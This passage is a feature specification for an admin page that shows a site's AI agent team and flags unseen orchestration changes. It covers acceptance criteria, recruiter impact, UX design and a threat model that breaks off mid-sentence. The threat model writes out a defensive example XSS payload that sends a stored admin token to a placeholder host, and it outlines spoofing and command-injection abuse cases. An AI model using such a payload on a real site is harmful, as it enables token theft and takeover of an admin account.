# Steven sees his product team in the admin, and every change to it waits for him like unread mail

Slug: `admin-team-page` · Branch: `admin-team-page` · Status: approved-pending-signoff
Asked by Steven on 2026-10-19: "make sure this page is updated every time we change the orchestration from now https://steven.wilssens.com/admin#assistant. Make sure it has a notification on the admin page if there was an update and it highlights where the updates were. Once I have seen the updates, it just behaves like an email and no longer shows as I have not yet seen the update". Decisions: (1) a new admin page **Team** (`#team`); `#assistant` stays about the public Ask assistant; (2) "seen" is stored on the server (D1), so it syncs across his devices like email. Further decisions of 2026-10-19 (go-live, the Site update rule, the write-up diagram, the seen rule) are under *Open questions*, answered, and applied throughout.

Depends on `review-team` (the team itself, with the flow chart in `.claude/team.md` and CLAUDE.md's diagram rule) merging into `main` first; it is merged into this branch, and this branch merges main in again before its own pull request.

## Problem

Reader: **Steven in `/admin`** (the third reader; recruiters never see this page, see Recruiter impact).

The agent orchestration (six roles in `.claude/agents/`, `/feature` and `/team-review` in
`.claude/skills/`, the flow and the bars in `.claude/team.md`, the `gates` and `team` jobs in
`.github/workflows/review.yml`, the team step in `.github/workflows/site-update.yml`, the gate
scripts) now changes from three places: his Claude Code sessions, the MCP's
`request_site_update`, and the Site update workflow itself. Today the only way for Steven to
know what the team is and what changed is to read those files or the `git log`. Nothing in
`/admin` shows the team; nothing tells him the orchestration changed; and `/admin#assistant`
(the page he pointed at) is about the public "Ask about Steven" assistant, not the team.
A hand-written page would drift the first time an agent file changes, which is exactly what
he asked to avoid ("updated every time we change the orchestration").

How we know: Steven's word (the ask above). `git log --first-parent origin/main` shows the
orchestration files already changed in twelve commits on main between 2026-10-17 and 2026-10-19
(`site-update.yml` in nine of them), with nobody told.

## Outcome

`/admin#team` always shows the team exactly as the deployed orchestration files define it,
with a diagram of the flow drawn from the chart in `.claude/team.md`, and the history of
every change to them. A change Steven has not seen yet shows in **Needs you**, as a badge on
the Team menu item, and as a highlight on the sections and flow steps it touched, until the
Team page has been in front of him for 5 seconds on any of his devices; then it reads as
read, like an opened email, and stays in the history, where he can mark it unread again.

The **orchestration files** are: `.claude/team.md`, `.claude/agents/*.md`,
`.claude/skills/*/SKILL.md`, `.github/workflows/review.yml`, the team step of
`.github/workflows/site-update.yml` (the step named `Let Claude make the change`, and only
that step: decision 2), `scripts/recruiter-check.mjs`, `scripts/recruiter-compare.mjs`,
`scripts/resume-gate.mjs`, `functions/_lib/review/**` (not tests), `specs/TEMPLATE.md`, and
the `## The team` section of `CLAUDE.md` (only that section, like the Site update team step:
a change elsewhere in `CLAUDE.md` is not a team change; added in fix round 1 at the product
manager's request; the Team page shows it small, as a Rules part with the paragraphs behind
a disclosure). They are listed once, in the generator (`ORCHESTRATION` in `scripts/team-manifest.mjs`), and
everything below reads that list.

**Page and content (never typed in)**

  `/admin#team`, with a tile on the Overview like the other pages. `/admin#assistant` is
  unchanged (same `data-part` list, same h2s and copy).
- AC-2: The page's content comes from a manifest generated by `npm run build` from the
  orchestration files of the commit being built, not from text in a component. It has a
  `section.card` with `data-part` for: **Flow** (the diagram, AC-20, and the numbered steps
  of `## The flow` in `.claude/team.md` in words), **What changed** (AC-6), **Roles** (the
  roles table of `team.md` and each `.claude/agents/*.md`: frontmatter `name` and
  `description`, and its `##` headings), **Gates** (each job key and `name:` in `review.yml`,
  the finding levels from `team.md`, the gate scripts), **Commands** (each
  `.claude/skills/*/SKILL.md`: `name`, `description`, `argument-hint`) and **Site update**
  (the team step of `site-update.yml`: its name and its numbered team lines). Each section
  links to its file on GitHub at the built commit. Check: a test reading
  `src/admin/**/*.{ts,tsx}` (not tests or fixtures) finds no agent `name` of the real
  `.claude/agents`, no `senior-recruiter`, no `gates` job name and no `90%`.
- AC-3: Adding `.claude/agents/<new-role>.md` (or a skill, or a job in `review.yml`) and
  rebuilding shows a new card for it with no change outside that file. Test: the generator
  run on a fixture repository with an extra agent file returns an extra role with its `name`
  and `description` (likewise an extra command, an extra gate).
- AC-4 (the "can never go stale" check): `npm test` fails, naming the file, when a tracked
  file under `.claude/`, in `.github/workflows/`, under `functions/_lib/review/` or matching
  `scripts/*-gate.mjs`, `scripts/*-check.mjs`, `scripts/*-compare.mjs` is neither in
  `ORCHESTRATION` nor in `IGNORED` with a one-line reason (e.g. `deploy.yml`,
  `resume-check.mjs`); an `IGNORED` entry without a reason or for a file that no longer
  exists fails too. The manifest is not committed: it is generated into the admin bundle on
  every build, from the files in that build, so it cannot lag them.
- AC-5: A missing or malformed orchestration file (no frontmatter, unreadable YAML, a chart
  that does not match the steps, a renamed Site update team step) does not fail the build:
  the generator skips that part and records it in `problems`, the Team page shows "This part
  could not be read from `<path>`" in its place, and a test running the generator on the real
  repository fails on any `problems` entry, so CI stops it before merge.
- AC-20 (the diagram; Steven, 2026-10-19: "when we explain how the AI agent workflow works,
  include a diagram or diagrams to make it easy to understand"; CLAUDE.md's diagram rule):
  the Team page opens with a diagram of the flow, drawn from the manifest, whose source is the
  Mermaid flowchart under `## The flow` in `.claude/team.md` (the same chart GitHub renders;
  no hand-made image, no second copy). The generator parses a small fixed subset of it, with
  no Mermaid package: node ids and labels (`id[...]`, `id([...])`, `id{...}`), `subgraph id
  [label] ... end` (its nodes are the group's members, e.g. the six reviews), edges `-->`,
  `---`, `-.->`/`-.-` with an optional label (`-- label -->`, `-.label.-`), chains and `&`,
  `class a,b you` and `class a,b gate`, and `%% step N: id` comments that tie each numbered
  step of `## The flow` to a node. The diagram shows the chart's nodes in order with the
  chart's own labels (today: Steven asks; Spec, with product manager, recruiter, designer and
  then security, tester, developer; Questions only Steven can answer?; Steven answers;
  Developer builds, with tests; Six reviews in parallel, fresh agents; Developer fixes, back
  to the reviews with the edge's label "changes requested, max 3 rounds"; Pull request +
  Review check on GitHub; Steven merges; Deploy to steven.wilssens.com), each node with the
  number(s) of the step(s) mapped to it, `You` on nodes classed `you` (where Steven decides)
  and `Gate` on nodes classed `gate`. Validation: every numbered step has exactly one
  `%% step` line, every `%% step` line names an existing node and an existing step, and every
  class names an existing node; otherwise it is a problem (AC-5) and the diagram falls back
  to the numbered steps as a plain vertical list. Every node whose step(s) changed in an
  unread update is highlighted the same way as a changed section (AC-11, the word `New`, not
  colour alone), and the highlight goes on the next visit once those updates are read. The
  diagram is a `figure` holding an `ol` in order, with a caption (its text alternative), no
  Tab stops, and no horizontal page scroll at 390px and 320px wide. Tests: (a) the generator
  on a fixture `team.md` with one extra step and one extra node mapped to it returns one
  extra diagram node with its label, step number and members, with no other file changed;
  (b) a fixture whose chart has no `%% step` line for step 4 (or names a missing node)
  yields a problem and `flow.diagram: null`; (c) a component test renders a fixture manifest
  with an unread update touching step 3 and finds the node of step 3, and only that node,
  marked `New` with an accessible name containing "new". A step counts as changed when its
  text or its chart node (label, members, class, edges) differs between the update's commit
  and that commit's first parent; steps are matched by title, so an inserted step does not
  mark the later ones.

**History: what changed**

- AC-6: The manifest lists the **updates**: every commit on the first-parent history of the
  built commit that touches an orchestration file, newest first, each with its full SHA (the
  update's id), committer date, summary, the sections and flow steps it touched, and a link
  to the commit on GitHub (and to the pull request when there is one). The summary is the
  commit subject; when the subject is GitHub's default "Merge pull request #N from …", it is
  the pull request title (the first non-empty body line). Merges of `main` into a branch are
  not updates (first-parent only). A change to `site-update.yml` is an update only when the
  text of its `Let Claude make the change` step differs from the first parent's (decision 2);
  a change only to its other steps (the résumé email, the Building refresh) is not. The
  same rule holds for `CLAUDE.md`: an update only when the text of its `## The team` section
  differs. git's own merges that bring a branch up to date ("Merge branch '…' into …",
  "Merge remote-tracking branch '…' into …") are not updates either. Tests:
  the generator on a fixture repository with a merge, a direct commit, a GitHub default
  merge and a commit that touches no orchestration file returns exactly the expected three
  updates; on a fixture with a `site-update.yml` change inside the team step, one outside it
  and one in both, it returns two updates; a fixture whose current `site-update.yml` has no
  step of that name gives a problem (AC-5) and counts every change to the file.
- AC-7: A build without the history (a shallow clone, or no git) still succeeds; the page
  shows the sections and says "The history of changes is not in this build"; it adds nothing
  to Needs you, the badge or the tile. The deploy, Review and Site update workflows already
  check out with `fetch-depth: 0`; that stays.

**Unread, read and the notification**

- AC-8: Read state is stored in D1 (migration `0011_team_reads.sql`: `team_reads(id, read,
  at)`, `read` 0 or 1) by update id, and read and written only through `GET` and `POST
  /api/team`, which answer 401 before touching the body or D1 without the `ADMIN_TOKEN`
  bearer token in the `Authorization` header (a token in a cookie or query string is 401).
  `POST` accepts only `Content-Type: application/json` (else 415) and a body of at most
  16 KB (else 413), with exactly `{ action, ids }`: `action` one of `read`, `unread`,
  `readAll`; `ids` 1 to 200 lower-case 40-hex strings; anything else is 400 with a fixed body
  that echoes nothing. `unread` is an upsert with `read = 0`, `read`/`readAll` an upsert with
  `read = 1` that keeps the first read time; repeating a request leaves the same state and
  returns the same body. No `Access-Control-*` header and no `Set-Cookie` on any answer;
  `Cache-Control: no-store` on every answer, errors included; other methods 405.
- AC-9 (the seen rule, decision 4): an update is **unread** until the Team page has been
  visible for 5 seconds in one visit; then every unread update is marked read on the server
  in one `readAll`. Only time while `document.visibilityState` is `visible` counts (paused
  while the tab is hidden); leaving `#team` resets the count. Loading the page in a
  background tab, scrolling or a visit shorter than 5 s marks nothing. After marking, the
  What changed head says `Marked as seen` with an `Undo` button that posts `unread` for
  exactly the ids it marked; each read row in the history has `Mark as unread`. The page's
  markers stay for the rest of the visit (they come from the state when the visit started);
  the badge and Needs you follow the server state. There is no "Mark all as read" or "Mark as
  seen" button in the UI (`readAll` exists in the API for the timer).
- AC-10: In the history, unread updates are distinguishable from read ones by more than colour
  (bold, the text `New` and a visually hidden `Not seen:`), and read updates stay listed.
- AC-11: Every section (and, inside Roles, every role card) touched by at least one unread
  update is highlighted with `data-new`, the text `New` in its heading and a line naming the
  latest such update's date and summary (not colour alone). Once the last unread update
  touching it is read, the highlight is gone on the next visit.
- AC-12: While any update is unread: **Needs you** on the Overview has one line for the Team
  page (the count, and the latest summary cut at 80 code points with `…`), the Team menu
  item has a badge with N (accessible name "Team, N not seen"), and the Overview tile appends
  `· N not seen`. With none unread, none of the three show it (`needs.ts`, tested in
  `needs.test.ts`).
- AC-13: Read state syncs across devices: an update read in one browser shows as read, and
  the badge and Needs you drop, after a reload in another browser with the same token
  (function test: read on one request, the next GET returns it read; unread likewise; nothing
  about read state in `localStorage` or `sessionStorage`).
- AC-14 (decision 1): The first deploy does not flood Needs you. The boundary is the
  generator's computed `launch`: the oldest first-parent commit that adds
  `scripts/team-manifest.mjs`. Every update older than `launch` is read unless D1 has a row
  saying otherwise; `launch` itself (this feature's merge, which touches `team.md` and
  `product-manager.md`) and every later update are unread until read. No SHA is typed in, no
  seeding, and the build needs no D1 access. `Mark as unread` on an update older than
  `launch` stores `read = 0` and it stays unread. When `launch` is not in the history (a
  shallow or partial history), nothing counts as unread.
- AC-15: When the read state cannot be loaded, the page still shows the sections and the
  history, shows the banner "Could not load what you have seen on the Team page (HTTP n).",
  says `Seen state unavailable` in the What changed head, counts nothing as unread in Needs
  you, the badge or the tile, and starts no seen timer. When saving fails, nothing is shown as
  read and the next visit tries again.

**Security**

- AC-21 (threat model C1 to C3): (a) the manifest is an allowlist of public repository
  content: the generator reads only the paths in `ORCHESTRATION`, through git from the built
  commit (`git show <sha>:<path>`, `git ls-tree`), never from the working tree, so `.review/`,
  `sources/`, `.dev.vars*` and `.env*` can never reach it even when present on the runner;
  each update carries only SHA, date, summary, PR number, touched sections and steps, and
  each section only the fields AC-2 names; a secret scan of the generated manifest (token
  patterns, e-mail addresses) fails the test; (b) every manifest string reaches the DOM as
  React text only (no `dangerouslySetInnerHTML`, no Markdown or HTML renderer, no manifest
  text in an attribute), after normalisation (control, bidi and zero-width characters
  stripped, whitespace collapsed) and length caps; (c) every link is built from the
  repository constant plus a validated part (`/commit/<40 hex>`, `/pull/<integer>`,
  `/blob/<sha>/<listed path>`), opens with `rel="noopener noreferrer"`, and anything that
  fails validation is text without a link.
- AC-22 (threat model C4 and C8): the generator calls git with an argument array, never a
  shell; keeps at most 200 updates and a manifest of at most 256 KB; never throws. The
  manifest is imported only from `src/admin/`; it is not emitted as a file in `dist/`, and
  the new API returns read ids only, never manifest content.

- Editing the orchestration from `/admin`.
- Feeding `/building-this-site` "The loop" from the same manifest or chart (the recruiter's

## Recruiter impact (senior-recruiter)

**What a recruiter sees differently: nothing, if it is built right.** Recruiters never open
`/admin`; the robots file disallows it and `admin.html` carries `noindex, nofollow`. The first
ten seconds on the home page, the résumé, contact, LinkedIn, experience, the assistant and the
job description check stay exactly as they are. The bar for this feature is therefore
"provably unchanged", not "better": every public page, the résumé and the assistant must read
and weigh the same as on main.

**Baseline** (worktree `admin-team-page` at `9fb4e8c`, one `npm run build`, 2026-10-19):

- `npm run check:recruiter` = **80/100** (main's data on the live pages: 80/100); 0 high,
  4 medium, 0 low; 11 questions only Steven can answer; "Not worse for recruiters than main's
  data on the live pages." Exit 0.
- `node scripts/resume-check.mjs --baseline https://steven.wilssens.com/resume-report.json --fail-on-drop`
  = ATS **100/100 → 100/100**, "the same as the live site"; 2 pages, 356 KB, 0 errors,
  0 warnings. Exit 0. (One standing question for Steven, unrelated to this feature: the cosmos
  2004–2005 role overlaps Info Support 2001–2004.)
- Public output of that build: 16 prerendered pages, 15 Markdown copies, `llms.txt`,
  `llms-full.txt`, `sitemap.xml` with 15 URLs (no `/admin`). Home page bundle:
  `main-*.js` 327.74 kB (97.25 kB gzip), `main-*.css` 54.28 kB (11.70 kB gzip); the admin
  bundle is a separate entry, `admin-*.js` 72.75 kB (21.50 kB gzip).

**Risks to the bar, and how each is checked at merge**

1. *The manifest leaking into public text.* `scripts/prerender.mjs` writes a Markdown copy of
   every `dist/*.html` except `admin.html`, and `llms.txt`, `llms-full.txt` and the sitemap from
   those. A new prerendered page (a `/team` route, a `team.html`, a page in `src/pageMeta.ts`)
   would land in all of them, and `llms-full.txt` is what LLM-based sourcing tools read. The
   team page must live only inside `admin.html` (`#team`), add nothing to `pageMeta.ts`, and
   the build must still report 15 Markdown pages and the same sitemap. A recruiter or their
   sourcing tool finding "agent orchestration" text with role names like "senior recruiter"
   on the public site would read as odd at best.
2. *The assistant's knowledge.* The "Ask about Steven" assistant reads `src/resume.ts`,
   `src/patents.ts`, the public dossier and the five Building articles' Markdown
   (`articlePages` in `functions/_lib/ask/prompt.ts`). The manifest must not be imported by
   `functions/_lib/ask/`, `src/webmcp.ts` (registered on every public page), or the public
   `/mcp`. If the assistant starts answering "who is on Steven's team?" with agent names, a
   recruiter will read that as Steven having reports he does not have. That is a fact about
   Steven without a source, and I block it.
3. *Bundle weight on public pages.* The manifest and the page must be imported only from
   `src/admin/` so Vite keeps them in the `admin` chunk. A shared module (`src/resume.ts`,
   `src/pageMeta.ts`, a util used by both entries) importing the generated file would pull it
   into `main-*.js`. Check at merge: `main-*.js` and `main-*.css` gzip sizes within 1% of the
   baseline above, and the manifest's sentinel `team-manifest/1` in no `dist/assets/main-*`
   or `dist/*.md` (role names cannot be the probe: the AI Breaker write-up already makes them
   public; reconciled into AC-18).
4. *A new public endpoint.* The read state goes through a Pages Function (the history is
   in the admin bundle, from public repository content) that answers 401 without `ADMIN_TOKEN`, under `/api/` (already `Disallow`ed in
   robots). No new unauthenticated route, no change to the public `/mcp` tools.
5. *What is public anyway.* `admin.html` and `/assets/admin-*.js` are static files anyone can
   fetch; only the data behind the admin API is gated. The repository is public, so the
   `.claude/` and workflow text in the admin bundle is not a secret, but nothing private
   (review reports in `.review/`, Steven's replies, D1 rows, open questions about Steven) may
   be baked into the build-time manifest. That belongs behind the token. Routed to the
   security engineer as a `minor`.
6. *The build itself.* The generator runs inside `npm run build`. If it fails on a missing
   or malformed `.claude/` file, the deploy fails and the live site stays on its old version.
   That is safe, but it means a typo in an agent file blocks a résumé fix. The generator
   should report the problem and skip the part, not fail the build (developer's call;
   I note it because a blocked résumé update is a recruiter cost).
7. *The résumé and the recruiter review.* No change to `src/resume.ts`, the PDF or
   `src/pageMeta.ts` is expected. Any diff there in this branch is out of scope and needs its
   own justification.

**What would make me block it (`CHANGES_REQUESTED`, blocker):**

- `npm run check:recruiter` below 80/100 or a new high finding, or the ATS score below 100 /
  below the live site's;
- any change to the public page count (16 HTML / 15 Markdown), `sitemap.xml`, `llms.txt` or
  `llms-full.txt` caused by this feature, or a manifest string in any `dist/*.md`,
  `dist/llms*.txt` or `dist/assets/main-*`;
- the assistant, WebMCP tools or the public `/mcp` able to read the manifest or the team data;
- the home page's JS or CSS heavier than the baseline by more than 1% (the team bar's 10%
  threshold is for changes meant for readers; this one is not);
- a new route under `/api/` that answers without `ADMIN_TOKEN`.

**What a recruiter would ask Steven that this should answer:** nothing on the admin page. But if
a hiring manager asks in an interview "how do you work with AI agents?", the honest, sourced
answer is what `/building-this-site` already tells in "The loop". That is where a reader
meets this story, not here.

**Opportunity (follow-up only, not in this spec):** the same generated description of the
team could feed `/building-this-site`, so "The loop" never drifts from `.claude/`. I would
want it, for one reason: today that section is hand-kept in step by the PM's acceptance
check, and a write-up that disagrees with the repository is a credibility risk if a technical
hiring manager reads both (the repository is public). I would want it on three conditions:
the article keeps telling it in prose for a reader, not as a dumped role table; it never
presents the agents as people Steven manages (a recruiter scanning for "team size" must not
mistake six agents for reports; the managed team size stays `profile` in `src/resume.ts`);
and it goes through its own spec and the full recruiter check, since it changes a public page,
its Markdown copy and the assistant's knowledge. Not part of this feature.

**Verdict on the spec (recruiter's section):** the feature is admin-only and leaves the
recruiter's reading the same, provided risks 1 to 4 hold. Checks 1 to 4 above become merge
evidence (the tester can make 1 and 3 site checks).

## Design (ux-designer)

The Team page is a reference page that is quiet most of the time and speaks up only when the
orchestration changed. It reuses the admin as it is: a menu item with a badge, a line in
**Needs you**, a tile, `section.card`s with `data-part` for the chip bar, the yellow of "waits
for you" (`--yellow`, already used by `.need` and `.tab-badge`), `.badge`, `.note`, `.empty`,
`.all-clear`, `.ghost`, `.banner`. Two new patterns, each with a reason: the flow diagram
(Steven asked for one) and the "New" marker on a section or a step. No new colour tokens.

### Where it sits

- **Menu**: `Team`, after `Career MCP` and before `Links` (the two "how the site is run"
  pages stay together). Icon: three heads (a group), drawn like the other 24px path icons.
  Badge: the number of updates not seen, the existing `.tab-badge` (1–99, `99+`).
- **Page head**: title `Team`; sub `The agents that write, build and review every change:
  the roles, the flow, the gates and the commands, read from the repository at each build.`
  No range switch (`range: false`); `Refresh` and `Updated … ago` as on every page.
- **Overview tile**: `Team` with the line `6 roles · 2 commands · last change 19 Oct`, and
  `· 2 not seen` appended while there are any (numbers and date from the data, never typed).
- **Needs you** (through `needs.ts`, page `team`): the count in `.need-n`, then
  - one: `change to your agent team you have not seen: “<the update's line>”`
  - several: `changes to your agent team you have not seen, the latest “<its line>”`
  - `Team →` on the right as for every need. The quoted line is the update's one-liner, cut
    at 80 characters with `…` so the need stays one or two lines on a phone.

### The flow for Steven

1. A change to `.claude/agents/*.md`, `.claude/team.md`, the `/feature` or `/team-review`
   skill, the Review workflow, a gate script or the Site update workflow's team step reaches
   main and deploys.
2. On any device, the overview shows the line in Needs you and the menu shows a badge on Team.
3. He opens Team (from the need, the tile or the menu). The page opens with a one-line
   notice of what is new (the newest update's line, `See what changed`), then the **flow
   diagram**, with the steps the update touched marked `New`. Below it **What changed** lists
   the unseen updates bold with a dot and a `New` label; each section the update touched
   carries a `New` marker and a line saying what changed there. The chip bar marks those
   parts too, so on a phone he can jump straight to them.
4. After the page has been in front of him for **5 seconds** the updates are recorded as
   seen on the server. Nothing moves on the page: the markers stay for this visit, the card
   head says `Marked as seen` with an `Undo` button, and the menu badge and the need go away
   (on every device at their next load).
5. Next visit, the updates read like opened mail: normal weight, no dot, no `New`, still in
   the history with their date, sections and pull request.

### When an update counts as seen (decided by Steven, 2026-10-19; AC-9)

**Seen after the Team page has been visible for 5 seconds in one visit, with `Undo`.** The lead
took this as what "behaves like an email" means; Steven may still override it (Open question 4).

- An email becomes read when it is opened, not when the inbox is. Here the page *is* the
  message: the newest update is the first line on it (the notice above the diagram) and the
  diagram right under it marks the steps it changed. Opening the page is opening the mail.
- The 5 seconds (counted only while `document.visibilityState` is `visible`, reset when he
  leaves `#team`) keep a mis-tap in the phone's sideways tab bar, or a page left behind in a
  background tab, from clearing the notification. That is what Outlook's "mark as read after
  N seconds" does for the same reason.
- A brief look on the phone that he wants to read properly later: `Undo` right there, and
  `Mark as unread` on any update in the history afterwards, exactly as in a mail client.
- Not on scroll: on a phone the changed section is often below the fold, a swipe is not
  reading, and per-section scroll tracking would clear updates piece by piece in a way that is
  hard to predict. Not explicit-only (`Mark all as seen`): a badge that waits for a button
  gets ignored, and then the badge means nothing. With the timer an explicit button adds
  nothing, so there is none.
- The markers stay until he leaves the page or reloads, so nothing he is reading disappears
  under his eyes.
- Seen state is per update (its id), stored on the server; `Undo` and `Mark as unread`
  store those ids as unread (`read = 0`; an update from before go-live is read by default,
  so unread must be stored, not a deleted row). If saving fails, nothing is marked and it is tried again on the
  next visit.

### The flow diagram (Steven's ask: "include a diagram to make it easy to understand")

**Placement.** The first card on the page (`data-part="Flow"`, h2 `How a change gets to
main`), directly under the notice line. It replaces the plain step list as the way the flow
is explained; the steps in words stay below it in the same card behind a disclosure
(`<details>`, summary `The steps in words`, closed by default), for the full sentences from
`.claude/team.md`.

**What it shows** (aligned with the chart in `.claude/team.md`, the source; AC-20): the
chart's nodes in order, with the chart's own labels. Today, left to right: `Steven asks:
/feature, the MCP, or a write-up refresh` (You) → `Spec: specs/slug.md` (a group: Product
manager, Recruiter, Designer; then, as `adds`, Security: threat model, Tester: test plan,
Developer: approach) → `Questions only Steven can answer?` (a decision: `yes, asked once` →
`Steven answers` (You) → build; `no` → build) → `Developer builds, with tests` → `Six reviews
in parallel, fresh agents` (a group: Code, Security, Tests 90%, Design + screenshots,
Recruiter: not worse, PM: acceptance) → `Developer fixes` (the loop: `changes requested, max
3 rounds`, back to the reviews) → `Pull request + Review check on GitHub: main's gates and
team review` → `Steven merges` (You) → `Deploy to steven.wilssens.com`. Each node shows the
number(s) of the numbered step(s) its `%% step` lines map to it (Spec carries 2 and 4,
Steven asks carries 1; Steven answers and Deploy carry none), its label, its members, and
`Gate` / `You` from the chart's classes. Every one of these strings comes from the
build-time manifest, which reads them from the chart; the component draws whatever the
manifest lists, so a new node, a seventh reviewer or a renamed check shows up at the next
build. Where the chart and the numbered steps disagree, the generator reports a problem and
the card shows the numbered steps as a plain vertical list. The component knows only four
shapes: a node, a decision (a node whose outgoing edges carry their labels, `yes` / `no`), a
parallel group (a subgraph, drawn as one node whose members are chips), and a loop back to
an earlier node (an edge to a node already drawn).

**How it is drawn.** HTML and CSS, not an SVG picture: an `ol` of nodes laid out with CSS
grid, connectors as CSS borders/pseudo-elements (`aria-hidden`). Real text reflows,
inherits the theme and is read by a screen reader; an SVG would need its own dark mode and
text that does not wrap.

- **At 1440** (the card is about 1150px wide): two lanes, `You` on top and `Team` below, as
  thin row labels in DM Mono on the left; the nodes are columns in order, each in its lane
  (`you`-classed nodes in You), so the places Steven acts stand out by position and by the
  `You` label. Nodes about 100–120px wide: step number + label, members in 12px muted below,
  wrapping. The reviews node is taller and holds its six reviewers as small chips stacked.
  The loop is a connector from `Developer fixes` back to the reviews drawn under the Team
  lane, labelled with the chart's edge label. Gate nodes carry a `Gate` badge.
- **From 1100 down to 700**: the same lanes do not fit, so the diagram becomes the vertical
  form below (a container query on the card, not the viewport, so it also behaves inside the
  admin's narrower main pane at 900–1100 with the side menu open).
- **At 390 (vertical)**: one node per row, full width, a down arrow between nodes (`↓`, a
  2px `--line` connector, centred). The lane becomes the `You` badge in the node's top right
  plus a `--paper` fill for Steven's nodes (fill repeats the label, never replaces it). Each
  node shows its one-line description here, since there is room. The parallel review is one
  node with its six chips wrapping. The loop is written, not drawn: `↺ Back to <target
  label>: <edge label>` inside the fixes node. No sideways scroll.
- **Both themes**: nodes `--card` on the card's `--paper`-inset area (a `.trend`-like inner
  panel: `--paper` background, `--line` border, radius 10), node border 1px `--line`,
  connectors `--muted` at 2px (≥3:1 against `--paper` in both themes: `#98a6a0` on
  `#0f1916`, `#586360` on `#f4f6f1`). `You` and `New` badges yellow with `#172121` text,
  `Gate` a plain `.badge`. Checked in Dark, Light and Auto.

**A highlighted (changed) step.** When an unseen update touched a step mapped to a node (its
text in team.md, or its node in the chart: label, members, class, edges), the node gets: a 2px
`--yellow` border instead of the 1px line, a 4px yellow bar on its left edge, a `New` badge
after its title, and its title in bold. The text `New` is what carries the meaning; border
and bar repeat it. A step that was added since he last looked gets `New` as well; a removed
step is named in the What changed line (`Removed: Spec sign-off`), not drawn.

**Accessible name and description.** The diagram is a `figure` with
`aria-labelledby` = the card's h2 and a visible `figcaption`:
`From your ask to the live site. You: the steps that wait for you. Gate: the change stops
until it passes.` The steps are an `ol` (`aria-label="The steps, in order"`), so the screen
reader says "list, 10 items" and reads in order. Each node reads as text, e.g.
`Step 6, Six reviews in parallel, fresh agents, new. Code, Security, Tests 90%, Design +
screenshots, Recruiter: not worse, PM: acceptance. Gate.` and `Step 7, Developer fixes. Back
to Six reviews in parallel: changes requested, max 3 rounds.` A decision reads its branches:
`Step 3, Questions only Steven can answer? Yes, asked once: Steven answers. No: Developer
builds, with tests.` Arrows, lane lines and the loop connector are `aria-hidden`; the order
of the list and the words "back to" carry what they show. Nothing in the diagram is focusable (it is a
picture made of text), so it adds no Tab stops; the `The steps in words` summary is the one
control in this card.

**States.** Nothing changed: no node marked. The manifest has no flow (the generator could not
read team.md): the card shows `.empty`: `Could not read the flow from .claude/team.md at
build time; the diagram is back after the next build.` A very long title or role name wraps
inside the node; at 1440 more than 10 nodes make them too narrow, so from 11 nodes the
diagram uses the vertical form at every width (the developer tests both). The chart and the
steps disagree (a problem): the card shows the numbered steps as a plain vertical list with
the line `The diagram could not be drawn from .claude/team.md; the steps are listed in
order.`

**Reduced motion.** No animation in the diagram at all (no drawing-in of arrows); the page
fade is already off under `prefers-reduced-motion`.

## Threat model (security-engineer)

The feature adds one build step, one data file baked into a public bundle, one admin API and
one table. None of it touches the assistant, WebMCP or the MCP server, and it must stay that
way. What I looked at: `functions/_lib/auth.ts` (`isAdmin`, constant-time compare, bearer
header only), `functions/api/stats.ts` (the admin endpoint pattern: 401 first, `no-store`,
fixed SQL with bound parameters), `src/admin/Admin.tsx` (token in `localStorage`, sent as
`Authorization: Bearer`, no cookie), `vite.config.ts` (CSP `script-src 'self'` plus hashes, no
`unsafe-inline` for scripts, `connect-src 'self'`, `frame-ancestors 'none'`), the
`admin`/`main` entries, and `functions/_middleware.ts` (previews share the production D1).

### What is new, and who controls it

| # | Entry point or data | Who can influence it | Reaches |
|---|---|---|---|
| E1 | The generator (inside `npm run build`): reads the orchestration files and `git log --first-parent` of the built commit | Whoever gets a commit merged: Steven, his Claude Code sessions, the Site update workflow (whose commit messages Claude writes from MCP proposals, which can carry visitor text from site questions and job descriptions), and the author of any pull request through its **title** (GitHub's default merge body) and **branch name** (the default merge subject) | The manifest |
| E2 | The manifest, compiled into `/assets/admin-*.js` | Same as E1 | **Anyone**: `admin.html` and its chunk are static, unauthenticated files of a public repository's site. Only the API behind them is gated. |
| E3 | The Team page rendering the manifest (sections, diagram, history, notice, chip bar, Needs you, tile) | Same as E1 | Steven's browser, in the origin that holds `ADMIN_TOKEN` in `localStorage` |
| E4 | New admin API for read state (e.g. `functions/api/team.ts`: `GET` the read ids, `POST` read / unread / read all) | Anyone on the internet can call it; only a holder of `ADMIN_TOKEN` must get past the first line | D1 |
| E5 | D1 migration (one new table of update ids and timestamps) | Code review only | Production and every preview (they share the database) |

Assets: `ADMIN_TOKEN` (in `localStorage` on the admin origin, the key to transcripts, the
dossier, proposals and analytics), Steven's private data in D1 and `.review/`, and the
integrity of the public site (recruiter-facing).

### Abuse cases

1. **Private data baked into a public file (E2).** The generator picks up more than the listed
   files: `.review/<slug>/*.md` (reviewers' reports, Steven's replies), `sources/` (other
   projects' checkouts in the Site update workflow), `.dev.vars`, `.env`, a D1 export, commit
   author e-mails, or the full commit body (which can carry `Co-Authored-By` lines and pasted
   text). Anyone who fetches `admin-*.js` reads it, and crawlers can index it (`robots.txt`
   disallows `/admin`, not `/assets/`). Likelihood: medium (a glob such as `.claude/**` or
   "all changed paths" is the easy way to write it). Impact: high for a secret, medium for
   private text.
2. **Stored XSS in the admin through a commit subject or PR title (E1 to E3).** A pull request
   titled `<img src=x onerror=fetch('//x/'+localStorage.adminToken)>` or
   `[see](javascript:...)`, merged by Steven without noticing (or written by the Site update
   workflow from injected visitor text), becomes the "summary" rendered in Needs you, the
   notice, the history and the section markers. If any of those goes through
   `dangerouslySetInnerHTML`, a Markdown renderer, an `href` built from the text, or a `style`
   attribute, the script runs in the origin that holds `ADMIN_TOKEN`. Likelihood: low today
   (React escapes text, CSP blocks inline script), high if someone "nicely" renders Markdown in
   the summaries later. Impact: full admin takeover. This is the case the controls below most
   need to pin with tests.
3. **Spoofed or misleading text.** A summary with bidi overrides (U+202A to U+202E,
   U+2066 to U+2069), zero-width characters, or newlines makes the history or the Needs you
   line read differently from the commit (Trojan Source), or breaks the one-line layout.
   Impact: low (Steven is misled about what changed); fix is cheap.
4. **Link injection.** A GitHub link built from commit text (a URL in the body, a PR "number"
   that is not a number, a path that is not in the list) points Steven at an attacker page
   from inside his admin. Impact: phishing for the token.
5. **Bundle bloat / build denial.** A pull request with a 100 KB title, thousands of
   orchestration commits, or a huge agent file inflates `admin-*.js` or slows the build;
   a malformed file must not fail the deploy (AC-5) but must not crash the generator into
   writing nothing either.
6. **Command injection in the build (E1).** The generator shells out to git with a path or
   ref interpolated into a shell string; a crafted file name under `.claude/agents/` (the
   repository allows almost any name) runs code on the CI runner that holds the Cloudflare
